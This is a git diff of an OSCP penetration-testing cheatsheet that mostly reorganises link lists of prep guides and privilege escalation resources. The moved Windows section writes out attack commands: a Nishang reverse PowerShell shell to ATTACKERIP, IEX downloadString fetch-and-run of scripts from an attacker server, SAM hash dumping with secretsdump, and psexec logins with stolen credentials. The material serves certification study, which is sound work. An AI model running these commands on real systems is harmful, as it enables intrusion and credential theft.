@@ -3,10 +3,11 @@
 # TABLE OF CONTENTS
 - [OSCP_CHEATSHEET](#oscp_cheatsheet)
 - [TABLE OF CONTENTS](#table-of-contents)
+  - [OSCP SubReddit](#oscp-subreddit)
+  - [OSCP Guides](#oscp-guides)
   - [Kali General Info](#kali-general-info)
   - [Terminal Resources](#terminal-resources)
   - [Note Taking Tools](#note-taking-tools)
-  - [OSCP Guides](#oscp-guides)
   - [Report Writing](#report-writing)
   - [Advice](#advice)
   - [Hacking Labs](#hacking-labs)
@@ -42,10 +43,10 @@
   - [MSFVENOM PAYLOAD](#msfvenom-payload)
   - [PASSWORD CRACKING](#password-cracking)
   - [PIVOTING](#pivoting)
-  - [PRIVILEGE ESCALATION](#privilege-escalation)
-  - [Linux Priv Esc troubleshooting](#linux-priv-esc-troubleshooting)
-  - [Linux Troubleshooting](#linux-troubleshooting)
-  - [Windows Privesc](#windows-privesc)
+  - [LINUX PRIVILEGE ESCALATION](#linux-privilege-escalation)
+    - [Linux Priv Esc troubleshooting](#linux-priv-esc-troubleshooting)
+    - [Linux Troubleshooting](#linux-troubleshooting)
+  - [WINDOWS PRIVILEGE ESCALATION](#windows-privilege-escalation)
   - [Windows Troublshooting](#windows-troublshooting)
   - [PROOFS](#proofs)
   - [REVERSE SHELL](#reverse-shell)
@@ -55,6 +56,26 @@
   - [ZIP](#zip)
   - [Buffer Overflow](#buffer-overflow)
 
+## OSCP SubReddit
+- [OSCP Reddit!](https://www.reddit.com/r/oscp)
+
+## OSCP Guides 
+- [Awesome OSCP GitHub](https://github.com/0x4D31/awesome-oscp)
+- [The Journey to Try Harder: TJnull’s Preparation Guide for PWK/OSCP](https://www.netsecfocus.com/oscp/2019/03/29/The_Journey_to_Try_Harder-_TJNulls_Preparation_Guide_for_PWK_OSCP.html)
+- [An Adventure to Try Harder: Tjnull's OSCP Journey](https://www.netsecfocus.com/oscp/review/2019/01/29/An_Adventure_to_Try_Harder_Tjnulls_OSCP_Journey.html)
+- [he Ultimate OSCP Preparation Guide, 2021 - johnjhacking](https://johnjhacking.com/blog/the-oscp-preperation-guide-2020/)
+- [How to prepare for PWK/OSCP, a noob-friendly guide](https://www.abatchy.com/2017/03/how-to-prepare-for-pwkoscp-noob)
+- [How To Pass the OSCP – a Beginner Friendly Guide](https://kentosec.com/2019/10/09/how-to-pass-the-oscp-a-beginner-friendly-guide/)
+- [Hakluke’s Ultimate OSCP Guide: Part 1 — Is OSCP for you? Some things you should know before you start](https://medium.com/@hakluke/haklukes-ultimate-oscp-guide-part-1-is-oscp-for-you-b57cbcce7440)
+- [Hakluke’s Ultimate OSCP Guide: Part 2 — Workflow and documentation tips](https://medium.com/@hakluke/haklukes-ultimate-oscp-guide-part-2-workflow-and-documentation-tips-9dd335204a48)
+- [Hakluke’s Ultimate OSCP Guide: Part 3 — Practical hacking tips and tricks](https://medium.com/@hakluke/haklukes-ultimate-oscp-guide-part-3-practical-hacking-tips-and-tricks-c38486f5fc97)
+- [Reddit - OSCP Lab & Exam Review and Tips](https://www.reddit.com/r/oscp/comments/ix81m8/oscp_lab_exam_review_and_tips/)
+- [Reddit - Passed - 1st Attempt. Thoughts, Tips, Facts](https://www.reddit.com/r/oscp/comments/j4jp6w/passed_1st_attempt_thoughts_tips_facts/)
+- [OSCP Preparation 2021 — Learning Path](https://ltsirkov.medium.com/oscp-preparation-2021-learning-path-41a88eb1a4b)
+- [More Lessons Learned About Trying Harder and Passing the Offensive Security Certified Professional Exam (OSCP)](https://www.tripwire.com/state-of-security/security-data-protection/passing-offensive-security-certified-professional-exam-oscp/)
+- [The Penultimate Guide to Defeat the OSCP](https://www.linkedin.com/pulse/penultimate-guide-defeat-oscp-corey-ball-oscp-cissp-cism/)
+- [A BEGINNERS GUIDE TO OSCP 2021](https://hxrrvs.medium.com/a-beginners-guide-to-oscp-2021-adb234be1ba0)
+- [59 Hosts to Glory — Passing the OSCP](https://medium.com/@Tib3rius/59-hosts-to-glory-passing-the-oscp-acf0fd384371)
 
 ## Kali General Info
 - [Terminal Setup Script](https://github.com/cameronww7/Kali-Setup)
@@ -79,24 +100,6 @@
 ## Note Taking Tools
 - [CherryTree](https://www.giuspen.com/cherrytree/)
 - [Screenshots](https://getgreenshot.org/)
-
-## OSCP Guides 
-- [Awesome OSCP GitHub](https://github.com/0x4D31/awesome-oscp)
-- [The Journey to Try Harder: TJnull’s Preparation Guide for PWK/OSCP](https://www.netsecfocus.com/oscp/2019/03/29/The_Journey_to_Try_Harder-_TJNulls_Preparation_Guide_for_PWK_OSCP.html)
-- [An Adventure to Try Harder: Tjnull's OSCP Journey](https://www.netsecfocus.com/oscp/review/2019/01/29/An_Adventure_to_Try_Harder_Tjnulls_OSCP_Journey.html)
-- [he Ultimate OSCP Preparation Guide, 2021 - johnjhacking](https://johnjhacking.com/blog/the-oscp-preperation-guide-2020/)
-- [How to prepare for PWK/OSCP, a noob-friendly guide](https://www.abatchy.com/2017/03/how-to-prepare-for-pwkoscp-noob)
-- [How To Pass the OSCP – a Beginner Friendly Guide](https://kentosec.com/2019/10/09/how-to-pass-the-oscp-a-beginner-friendly-guide/)
-- [Hakluke’s Ultimate OSCP Guide: Part 1 — Is OSCP for you? Some things you should know before you start](https://medium.com/@hakluke/haklukes-ultimate-oscp-guide-part-1-is-oscp-for-you-b57cbcce7440)
-- [Hakluke’s Ultimate OSCP Guide: Part 2 — Workflow and documentation tips](https://medium.com/@hakluke/haklukes-ultimate-oscp-guide-part-2-workflow-and-documentation-tips-9dd335204a48)
-- [Hakluke’s Ultimate OSCP Guide: Part 3 — Practical hacking tips and tricks](https://medium.com/@hakluke/haklukes-ultimate-oscp-guide-part-3-practical-hacking-tips-and-tricks-c38486f5fc97)
-- [Reddit - OSCP Lab & Exam Review and Tips](https://www.reddit.com/r/oscp/comments/ix81m8/oscp_lab_exam_review_and_tips/)
-- [Reddit - Passed - 1st Attempt. Thoughts, Tips, Facts](https://www.reddit.com/r/oscp/comments/j4jp6w/passed_1st_attempt_thoughts_tips_facts/)
-- [OSCP Preparation 2021 — Learning Path](https://ltsirkov.medium.com/oscp-preparation-2021-learning-path-41a88eb1a4b)
-- [More Lessons Learned About Trying Harder and Passing the Offensive Security Certified Professional Exam (OSCP)](https://www.tripwire.com/state-of-security/security-data-protection/passing-offensive-security-certified-professional-exam-oscp/)
-- [The Penultimate Guide to Defeat the OSCP](https://www.linkedin.com/pulse/penultimate-guide-defeat-oscp-corey-ball-oscp-cissp-cism/)
-- [A BEGINNERS GUIDE TO OSCP 2021](https://hxrrvs.medium.com/a-beginners-guide-to-oscp-2021-adb234be1ba0)
-- [59 Hosts to Glory — Passing the OSCP](https://medium.com/@Tib3rius/59-hosts-to-glory-passing-the-oscp-acf0fd384371)
 
 
 ## Report Writing
@@ -159,22 +162,6 @@
   - [Path Traversals OWASP](https://owasp.org/www-community/attacks/Path_Traversal)
   - [Win File Perms](https://superuser.com/questions/364083/windows-list-files-and-their-permissions-access-in-command-line)
 
-- PrivEsc Courses
-  - [PrivEsc Strategy](https://www.youtube.com/watch?v=VpNaPAh93vE)
-  - [Windows Privilege Escalation for OSCP & Beyond! - Tib3rius](https://www.udemy.com/course/windows-privilege-escalation/)
-  - [Windows Privilege Escalation for Beginners - TCM](https://www.udemy.com/course/)
-  - [absolomb - 2018-01-26-Windows-Privilege-Escalation-Guide](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
-
-- PrivEsc Cheatsheets/Script
-  - [Windows privilege escalation (enumeration) script - Powerless](https://github.com/M4ximuss/Powerless)
-  - [Windows privilege escalation (enumeration) script - PowerUP](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1)
-  - [Scripts - PEASS - Privilege Escalation Awesome Scripts SUITE](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite)
-  - [Win Priv Escl](https://github.com/frizb/Windows-Privilege-Escalation)
-  - [swisskyrepo - Privilege Escalation](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
-  - [checklist-windows-privilege-escalation](https://book.hacktricks.xyz/windows/checklist-windows-privilege-escalation)
-  - [sushant747 - privilege_escalation_windows](https://sushant747.gitbooks.io/total-oscp-guide/content/privilege_escalation_windows.html)
-  - [SecWiki - windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)
-
 - VulnHub
   - [Ignitetechnologies - Linux Priv Esc](https://github.com/Ignitetechnologies/Privilege-Escalation)
 
@@ -187,22 +174,6 @@
   - [Path Traversals OWASP](https://owasp.org/www-community/attacks/Path_Traversal)
   - [Linux File Perms](https://www.pluralsight.com/blog/it-ops/linux-file-permissions)
   - [Restricted Linux Shell Escaping Techniques](https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/)
-
-- PrivEsc Courses
-  - [PrivEsc Strategy](https://www.youtube.com/watch?v=VpNaPAh93vE)
-  - [Linux Privilege Escalation for OSCP & Beyond! = Tib3rius](https://www.udemy.com/course/linux-privilege-escalation/)
-  - [Linux Privilege Escalation for Beginners - TCM](https://www.udemy.com/course/linux-privilege-escalation-for-beginners/)
-
-- PrivEsc Cheatsheets/SCripts
-  - [Linux privilege escalation (enumeration) script - LinEnum.sh](https://github.com/rebootuser/LinEnum)
-  - [Abusing SUDO (Linux Privilege Escalation)](https://touhidshaikh.com/blog/2018/04/11/abusing-sudo-linux-privilege-escalation/)
-  - [Scripts - PEASS - Privilege Escalation Awesome Scripts SUITE](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite)
-  - [GTFOBins](https://gtfobins.github.io/)
-  - [g0tmi1k - basic-linux-privilege-escalation](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
-  - [sushant747 - privilege_escalation_-_linux](https://sushant747.gitbooks.io/total-oscp-guide/content/privilege_escalation_-_linux.html)
-  - [hacktricks - linux-privilege-escalation-checklist](https://book.hacktricks.xyz/linux-unix/linux-privilege-escalation-checklist)
-  - [swisskyrepo - privilege_escalation_Linux](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md)
-  - [lucyoa - kernel-exploits](https://github.com/lucyoa/kernel-exploits)
 
 - Other
 
@@ -1042,6 +1013,7 @@
   - `path.cmd "C:\Program Files (x86)\Common Files\test.txt"`
   - C:\PROGRA~2\COMMON~1\test.txt -> Valid path without spaces
 
+
 ## MSFVENOM PAYLOAD
 - [MSFVEMON CheatSheet] <https://netsec.ws/?p=331>
 - Linux
@@ -1097,8 +1069,8 @@
 - John
   - `john --wordlist=<PASSWORDS_LIST> hash.txt`
 
-## PIVOTING
 
+## PIVOTING
 - sshuttle
   - `sshuttle <USER>@<IP> <IP_OF_THE_INTERFACE>/CIDR`
 - Proxychains
@@ -1108,8 +1080,24 @@
   - <https://artkond.com/2017/03/23/pivoting-guide/>
 
 
-## PRIVILEGE ESCALATION
-- Linux
+## LINUX PRIVILEGE ESCALATION
+- PrivEsc Courses
+  - [PrivEsc Strategy](https://www.youtube.com/watch?v=VpNaPAh93vE)
+  - [Linux Privilege Escalation for OSCP & Beyond! = Tib3rius](https://www.udemy.com/course/linux-privilege-escalation/)
+  - [Linux Privilege Escalation for Beginners - TCM](https://www.udemy.com/course/linux-privilege-escalation-for-beginners/)
+
+- PrivEsc Cheatsheets/SCripts
+  - [Linux privilege escalation (enumeration) script - LinEnum.sh](https://github.com/rebootuser/LinEnum)
+  - [Abusing SUDO (Linux Privilege Escalation)](https://touhidshaikh.com/blog/2018/04/11/abusing-sudo-linux-privilege-escalation/)
+  - [Scripts - PEASS - Privilege Escalation Awesome Scripts SUITE](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite)
+  - [GTFOBins](https://gtfobins.github.io/)
+  - [g0tmi1k - basic-linux-privilege-escalation](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
+  - [sushant747 - privilege_escalation_-_linux](https://sushant747.gitbooks.io/total-oscp-guide/content/privilege_escalation_-_linux.html)
+  - [hacktricks - linux-privilege-escalation-checklist](https://book.hacktricks.xyz/linux-unix/linux-privilege-escalation-checklist)
+  - [swisskyrepo - privilege_escalation_Linux](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md)
+  - [lucyoa - kernel-exploits](https://github.com/lucyoa/kernel-exploits)
+
+- Attacks
   - Enumeration scripts
     - `bash LinEnum.sh`
     - `bash lse.sh -l 1`
@@ -1152,7 +1140,7 @@
     ```
 
 
-## Linux Priv Esc troubleshooting
+### Linux Priv Esc troubleshooting
 - Did you check all cronjobs?
 - Did you check all processes running as root or another user?
 - Did you see if mountable file systems are available?
@@ -1162,7 +1150,8 @@
 - .ssh?
 - .bash_history?~~
 
-## Linux Troubleshooting
+
+### Linux Troubleshooting
 - Did an RCE test work but your payload fail?
 - Try changing single quotes to double quotes or in some cases, like a powershell command, try double to triple and vice versa
 - Try escaping special characters
@@ -1177,41 +1166,62 @@
 - do you have write access to the CWD?
 
 
-## Windows Privesc
-- Test if powershell is working without breaking shell
-- `powershell whoami`
-- Pivot DoS to powershell using Nishang reverse powershell script.
-- Listen w/ nc on a new port.
-- Make a copy of `Invoke-PowerShellTcp.ps1` and add `Invoke-PowerShellTcp -Reverse -IPAddress ATTACKERIP -Port NEWLISTENERPORT` at the bottom of the copy file to run the command automatically
-- Start an HTTP server in the root directoy of the modified nishang script copy
-- Run this from DoS: `powershell "IEX(New-Object Net.WebClient).downloadString("http://0.0.0.0/nishang.ps1")"`
-- Go to your listener terminal, you should now have a reverse PS shell
-- Download string that loads a ps script into memory (if you want it to auto run make sure there is a call to the function to do so at the bottom of the script, or else it'll just load the functions into memory)
-- `IEX(New-Object Net.WebClient).downloadString("http://0.0.0.0/jaws.ps1")`
-- Download file
-- PS `IEX(New-Object Net.Webclient).downloadFile("<urltofile>","savelocation")`
-- Run cmd as other user
-- PS > `$SecPass = ConvertTo-SecureString "password" -AsPlainText -Force; $cred = New-Object system.management.Automation.PSCredential('username', $SecPass); Start-Process -FilePath "powershell" -argumentlist "CMD" -Credential $cred`
-- DOS > `\Windows\System32\runas.exe`
-- Run exe
-- PS from working directory `Start-Process -FilePath "sort.exe"`
-- PS from other directory `Start-Process -FilePath "myfile.txt" -WorkingDirectory "C:\PS-Test"`
-- PS as admin `Start-Process -FilePath "powershell" -Verb RunAs -Credential $cred` (See above on how to create credential)
-- PS with arguments `Start-Process -FilePath "$env:comspec" -ArgumentList "/c dir ``"%systemdrive%\program files\``""`
-- Decrypy SAM password hashes
-- `impacket-secretsdump -sam SAMFILE -system SYSTEMFILE local`
-- Determine admin accounts
-- DOS: `net localgroup administrators`
-- SAM and SYSTEM file location
-- `Windows/System32/config`
-- Log into remote windows host with stolen creds (SMB required)
-- `psexec.py user@ip`
-- Find shortcut location (`*.lnk`)
-- PS `$Wscript = New-Object -ComObject Wscript.shell; $shortcut = Get-ChildItem *.lnk'; $Wscript.CreateShortcut($shortcut)`
-- Remember to check for dates when patches were applied, it'll key you into good potential kernel exploits
-- Check panther directory, install logs get put in here and contain creds
-- Read contents of file in PS shell
-- `get-Content "filename"`
+## WINDOWS PRIVILEGE ESCALATION
+- PrivEsc Courses
+  - [PrivEsc Strategy](https://www.youtube.com/watch?v=VpNaPAh93vE)
+  - [Windows Privilege Escalation for OSCP & Beyond! - Tib3rius](https://www.udemy.com/course/windows-privilege-escalation/)
+  - [Windows Privilege Escalation for Beginners - TCM](https://www.udemy.com/course/)
+  - [absolomb - 2018-01-26-Windows-Privilege-Escalation-Guide](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
+
+- PrivEsc Resources
+  - [sherlock.ps1](https://github.com/rasta-mouse/Sherlock)
+  - [FuzzySecurity](https://www.fuzzysecurity.com/tutorials/16.html)
+  - [Windows Exploit Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
+  - [Windows privilege escalation (enumeration) script - Powerless](https://github.com/M4ximuss/Powerless)
+  - [Windows privilege escalation (enumeration) script - PowerUP](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1)
+  - [Scripts - PEASS - Privilege Escalation Awesome Scripts SUITE](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite)
+  - [Win Priv Escl](https://github.com/frizb/Windows-Privilege-Escalation)
+  - [swisskyrepo - Privilege Escalation](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
+  - [checklist-windows-privilege-escalation](https://book.hacktricks.xyz/windows/checklist-windows-privilege-escalation)
+  - [sushant747 - privilege_escalation_windows](https://sushant747.gitbooks.io/total-oscp-guide/content/privilege_escalation_windows.html)
+  - [SecWiki - windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)
+
+
+- Attacks
+  - Test if powershell is working without breaking shell
+  - `powershell whoami`
+  - Pivot DoS to powershell using Nishang reverse powershell script.
+  - Listen w/ nc on a new port.
+  - Make a copy of `Invoke-PowerShellTcp.ps1` and add `Invoke-PowerShellTcp -Reverse -IPAddress ATTACKERIP -Port NEWLISTENERPORT` at the bottom of the copy file to run the command automatically
+  - Start an HTTP server in the root directoy of the modified nishang script copy
+  - Run this from DoS: `powershell "IEX(New-Object Net.WebClient).downloadString("http://0.0.0.0/nishang.ps1")"`
+  - Go to your listener terminal, you should now have a reverse PS shell
+  - Download string that loads a ps script into memory (if you want it to auto run make sure there is a call to the function to do so at the bottom of the script, or else it'll just load the functions into memory)
+  - `IEX(New-Object Net.WebClient).downloadString("http://0.0.0.0/jaws.ps1")`
+  - Download file
+  - PS `IEX(New-Object Net.Webclient).downloadFile("<urltofile>","savelocation")`
+  - Run cmd as other user
+  - PS > `$SecPass = ConvertTo-SecureString "password" -AsPlainText -Force; $cred = New-Object system.management.Automation.PSCredential('username', $SecPass); Start-Process -FilePath "powershell" -argumentlist "CMD" -Credential $cred`
+  - DOS > `\Windows\System32\runas.exe`
+  - Run exe
+  - PS from working directory `Start-Process -FilePath "sort.exe"`
+  - PS from other directory `Start-Process -FilePath "myfile.txt" -WorkingDirectory "C:\PS-Test"`
+  - PS as admin `Start-Process -FilePath "powershell" -Verb RunAs -Credential $cred` (See above on how to create credential)
+  - PS with arguments `Start-Process -FilePath "$env:comspec" -ArgumentList "/c dir ``"%systemdrive%\program files\``""`
+  - Decrypy SAM password hashes
+  - `impacket-secretsdump -sam SAMFILE -system SYSTEMFILE local`
+  - Determine admin accounts
+  - DOS: `net localgroup administrators`
+  - SAM and SYSTEM file location
+  - `Windows/System32/config`
+  - Log into remote windows host with stolen creds (SMB required)
+  - `psexec.py user@ip`
+  - Find shortcut location (`*.lnk`)
+  - PS `$Wscript = New-Object -ComObject Wscript.shell; $shortcut = Get-ChildItem *.lnk'; $Wscript.CreateShortcut($shortcut)`
+  - Remember to check for dates when patches were applied, it'll key you into good potential kernel exploits
+  - Check panther directory, install logs get put in here and contain creds
+  - Read contents of file in PS shell
+  - `get-Content "filename"`
 
 - Windows
   - Enumeration scripts
